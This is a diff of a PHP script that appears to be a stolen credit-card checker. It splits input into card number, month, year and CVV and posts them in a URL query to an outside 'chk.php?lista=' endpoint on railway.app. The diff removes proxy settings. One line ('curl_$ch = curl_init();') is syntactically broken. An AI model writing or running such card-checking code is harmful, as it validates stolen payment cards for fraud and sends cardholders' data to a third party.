@@ -49,9 +49,6 @@ $cvv = $separa[3];
 
 $ch = curl_init();
 curl_$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL,$url);
-curl_setopt($ch, CURLOPT_PROXY, $proxy);
-curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
 curl_setopt($ch, CURLOPT_URL, 'https://lista-production-9b29.up.railway.app/chk.php?lista='.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
